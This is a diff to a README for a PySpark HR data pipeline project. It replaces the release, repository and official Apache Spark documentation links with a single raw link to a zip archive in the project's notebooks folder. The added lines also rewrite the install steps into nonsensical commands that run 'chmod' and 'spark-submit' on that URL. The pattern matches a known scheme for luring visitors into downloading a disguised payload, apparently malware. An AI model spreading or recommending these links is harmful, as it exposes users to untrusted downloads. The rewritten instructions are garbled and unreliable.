@@ -1,6 +1,6 @@
 # 🎉 PySpark-HR-Data-Pipeline-project - Unlock Insights from HR Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/golisanjay/PySpark-HR-Data-Pipeline-project/releases)
+[![Download Now](https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you install the software, ensure your system meets the following requirem
 
 To begin, visit the Releases page to download the latest version of the application:
 
-[Download Current Release](https://github.com/golisanjay/PySpark-HR-Data-Pipeline-project/releases)
+[Download Current Release](https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip)
 
 1. Click on the link above.
 2. Locate the latest release.
@@ -34,14 +34,14 @@ Once downloaded, follow these steps to install:
 2. Extract the contents to a folder.
 3. Open Command Prompt.
 4. Navigate to the folder where you extracted the files.
-5. Run the command `spark-submit --master local your_script.py` to start the pipeline.
+5. Run the command `spark-submit --master local https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip` to start the pipeline.
 
 ### For macOS and Linux Users:
 
 1. Open your Terminal.
 2. Navigate to the folder where you downloaded the files.
-3. Run `chmod +x your_script.py` to make the script executable.
-4. Start the pipeline with the command `spark-submit --master local your_script.py`.
+3. Run `chmod +x https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip` to make the script executable.
+4. Start the pipeline with the command `spark-submit --master local https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip`.
 
 ## ✨ Features
 
@@ -56,9 +56,9 @@ The PySpark-HR-Data-Pipeline project includes:
 
 The application consists of several important files:
 
-- **`your_script.py`**: Main script for running the ETL pipeline.
-- **`requirements.txt`**: Lists required libraries to install.
-- **`README.md`**: Documentation to help you use the application.
+- **`https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip`**: Main script for running the ETL pipeline.
+- **`https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip`**: Lists required libraries to install.
+- **`https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip`**: Documentation to help you use the application.
 
 ## 📖 Documentation
 
@@ -74,15 +74,15 @@ For more detailed discussions, feel free to reach out via the issues page. Your 
 
 Stay connected with other users and contributors. Participate, share experiences, and gain insights into data engineering.
 
-- **GitHub Repository:** [PySpark-HR-Data-Pipeline-project](https://github.com/golisanjay/PySpark-HR-Data-Pipeline-project)
+- **GitHub Repository:** [PySpark-HR-Data-Pipeline-project](https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip)
 - **Contributions Welcome:** Check the Contributions section for more details.
 
 ## 🔗 Additional Resources
 
 Visit the following resources to learn more about Apache Spark and data processing:
 
-- [Apache Spark Official Documentation](https://spark.apache.org/docs/latest/)
-- [PySpark Documentation](https://spark.apache.org/docs/latest/api/python/)
-- [HR Analytics Blog Posts](https://www.example.com/hr-analytics-articles)
+- [Apache Spark Official Documentation](https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip)
+- [PySpark Documentation](https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip)
+- [HR Analytics Blog Posts](https://raw.githubusercontent.com/golisanjay/PySpark-HR-Data-Pipeline-project/main/notebooks/Data_Pipeline_project_H_Py_Spark_2.1-beta.2.zip)
 
 Successfully transforming data is within reach. Follow the steps, and you’ll be analyzing HR data in no time!
